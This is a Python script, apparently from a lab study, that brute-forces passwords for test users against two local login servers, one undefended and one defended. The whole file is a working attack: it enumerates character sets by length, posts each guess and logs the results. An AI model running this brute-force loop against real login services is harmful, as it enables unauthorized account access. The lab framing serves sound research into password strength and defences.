import requests
import string
import time
import os

# ======================================
# LAB LIMITS
# ======================================
MAX_ATTEMPTS = 1_000_000
MAX_TIME = 7200  # 2 hours

# Create logs folder if missing
os.makedirs("logs", exist_ok=True)

# ======================================
# CATEGORY DEFINITIONS (from generate_users.py)
# ======================================
CATEGORIES = {
    "weak": {
        "user": "user01",
        "charset": string.ascii_lowercase + string.digits,
        "min_len": 4,
        "max_len": 6
    },
    "medium": {
        "user": "user11",
        "charset": string.ascii_lowercase + string.ascii_uppercase + string.digits,
        "min_len": 7,
        "max_len": 10
    },
    "strong": {
        "user": "user21",
        "charset": (
            string.ascii_lowercase +
            string.ascii_uppercase +
            string.digits +
            "!@#$%^&*"
        ),
        "min_len": 11,
        "max_len": 16
    }
}

# ======================================
# SEND LOGIN REQUEST
# ======================================
def attempt(url, username, password, logfile):
    """Send a login attempt to the server."""
    try:
        r = requests.post(url, json={
            "username": username,
            "password": password,
            "logfile": logfile
        })
        return r.json().get("status") == "success"
    except Exception:
        return False

# ======================================
# BRUTE FORCE FOR ONE CATEGORY
# ======================================
def brute_force(url, category_name, config, logfile):
    """Brute-force attack limited by attempts and time."""

    username = config["user"]
    CHARSET = config["charset"]
    MIN_LEN = config["min_len"]
    MAX_LEN = config["max_len"]

    # Record start time
    start_time_global = time.time()
    start_iso = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(start_time_global))

    # LOG HEADER
    with open(logfile, "a") as f:
        f.write("\n=============================================\n")
        f.write("BRUTeforce RUN START\n")
        f.write(f"Category: {category_name.upper()}\n")
        f.write(f"User: {username}\n")
        f.write(f"Server: {url}\n")
        f.write(f"Start Time: {start_iso}\n")
        f.write("=============================================\n")

    print("\n========================================")
    print(f"STARTING BRUTE FORCE ({category_name.upper()})")
    print("User:", username)
    print("Server:", url)
    print("Logging to:", logfile)
    print("Charset size:", len(CHARSET))
    print("Length range:", MIN_LEN, "-", MAX_LEN)
    print("========================================\n")

    attempts = 0

    # Recursive generator
    def generate(prefix, length):
        if len(prefix) == length:
            yield prefix
            return
        for ch in CHARSET:
            yield from generate(prefix + ch, length)

    # Try all lengths
    for length in range(MIN_LEN, MAX_LEN + 1):
        print(f"[*] Trying passwords of length {length}")

        for pwd in generate("", length):
            attempts += 1
            elapsed = time.time() - start_time_global

            # Time limit
            if elapsed > MAX_TIME:
                end_iso = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                with open(logfile, "a") as f:
                    f.write("TIME LIMIT REACHED (2 Hours)\n")
                    f.write(f"End Time: {end_iso}\n")
                    f.write(f"Attempts: {attempts}\n")
                    f.write(f"Total Time: {round(elapsed, 3)} seconds\n")
                    f.write("---------------------------------------------\n")
                return

            # Attempt limit
            if attempts > MAX_ATTEMPTS:
                end_iso = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                with open(logfile, "a") as f:
                    f.write("ATTEMPT LIMIT REACHED (1,000,000)\n")
                    f.write(f"End Time: {end_iso}\n")
                    f.write(f"Attempts: {attempts}\n")
                    f.write(f"Total Time: {round(elapsed, 3)} seconds\n")
                    f.write("---------------------------------------------\n")
                return

            # Send attempt
            if attempt(url, username, pwd, logfile):
                end_iso = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                with open(logfile, "a") as f:
                    f.write("SUCCESS!\n")
                    f.write(f"Password: {pwd}\n")
                    f.write(f"End Time: {end_iso}\n")
                    f.write(f"Attempts: {attempts}\n")
                    f.write(f"Total Time: {round(elapsed, 3)} seconds\n")
                    f.write("---------------------------------------------\n")
                return

    # Failed
    end_iso = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    total_elapsed = time.time() - start_time_global
    with open(logfile, "a") as f:
        f.write("NO PASSWORD FOUND\n")
        f.write(f"End Time: {end_iso}\n")
        f.write(f"Attempts: {attempts}\n")
        f.write(f"Total Time: {round(total_elapsed, 3)} seconds\n")
        f.write("---------------------------------------------\n")

# ======================================
# RUN BOTH SERVERS
# ======================================
def main():

    # -------------------------------
    # NO DEFENSE SERVER (6000)
    # -------------------------------
    url_no_def = "http://127.0.0.1:6000/login"
    for cat in CATEGORIES:
        logfile = f"logs/bruteforce_no_defense_{cat}.log"
        brute_force(url_no_def, cat, CATEGORIES[cat], logfile)

    # -------------------------------
    # DEFENSE SERVER (5000)
    # -------------------------------
    url_def = "http://127.0.0.1:5000/login"
    for cat in CATEGORIES:
        logfile = f"logs/bruteforce_with_defense_{cat}.log"
        brute_force(url_def, cat, CATEGORIES[cat], logfile)

main()
